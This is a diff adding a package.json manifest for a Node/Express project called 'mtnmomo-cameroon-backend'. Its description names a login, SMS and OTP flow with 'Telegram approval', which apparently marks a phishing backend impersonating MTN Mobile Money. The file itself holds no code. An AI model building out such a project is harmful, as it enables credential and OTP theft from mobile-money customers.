@@ -1,0 +1,16 @@
+{
+  "name": "mtnmomo-cameroon-backend",
+  "version": "1.0.0",
+  "description": "MTN MoMo Cameroon backend — 3-stage flow (login, sms, otp) with Telegram approval",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "engines": {
+    "node": ">=18"
+  },
+  "dependencies": {
+    "express": "^4.19.2",
+    "cors": "^2.8.5"
+  }
+}
